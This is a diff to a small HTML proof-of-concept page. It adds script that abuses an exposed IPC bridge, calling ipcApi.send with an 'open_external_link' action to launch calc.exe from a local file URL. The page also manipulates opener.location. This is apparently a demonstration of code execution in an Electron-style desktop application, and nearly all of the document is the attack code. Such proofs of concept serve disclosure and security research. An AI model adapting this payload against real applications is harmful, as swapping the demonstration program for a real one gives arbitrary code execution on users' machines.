@@ -2,6 +2,11 @@
 <html>
 <h1>poc</h1>
 <script>
+    try {
+        ipcApi.send('main-action-triggered',{actionEnum:'open_external_link',payload:'file:///c:/windows/system32/calc.exe'});
+    } catch(er) {
+        console.log(er);
+    };
 opener.location = '/';
 
 if (opener.opener != undefined) {
@@ -18,4 +23,5 @@ if (opener.opener != undefined) {
 }
 </script>
 </html>
+
 
